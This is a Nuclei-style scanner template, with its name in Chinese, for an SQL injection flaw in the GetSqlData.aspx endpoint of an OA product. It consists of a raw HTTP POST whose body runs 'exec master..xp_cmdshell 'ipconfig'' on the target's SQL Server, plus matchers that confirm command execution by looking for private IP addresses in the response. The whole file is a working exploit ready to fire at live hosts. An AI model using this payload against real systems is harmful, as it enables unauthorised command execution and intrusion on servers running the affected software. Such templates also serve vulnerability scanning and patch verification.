id: jinheOA-C6-GetSqlData-aspx-SQL

info:
  name: 某和OA C6-GetSqlData.aspx SQL注入漏洞
  author: cnaq
  severity: high
  description: 某和OA C6-GetSqlData.aspx SQL注入漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%9F%90%E5%92%8COA%20C6-GetSqlData.aspx%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: jinheOA,download,file,read

requests:
  - raw:
      - |
        POST /C6/Control/GetSqlData.aspx/.ashx
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
        Connection: close
        Content-Length: 189
        Content-Type: text/plain
        Accept-Encoding: gzip

        exec master..xp_cmdshell 'ipconfig'

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - '[^0-9]((127\.0\.0\.1)|(10\.\d{1,3}\.\d{1,3}\.\d{1,3})|(172\.((1[6-9])|(2\d)|(3[01]))\.\d{1,3}\.\d{1,3})|(192\.168\.\d{1,3}\.\d{1,3}))'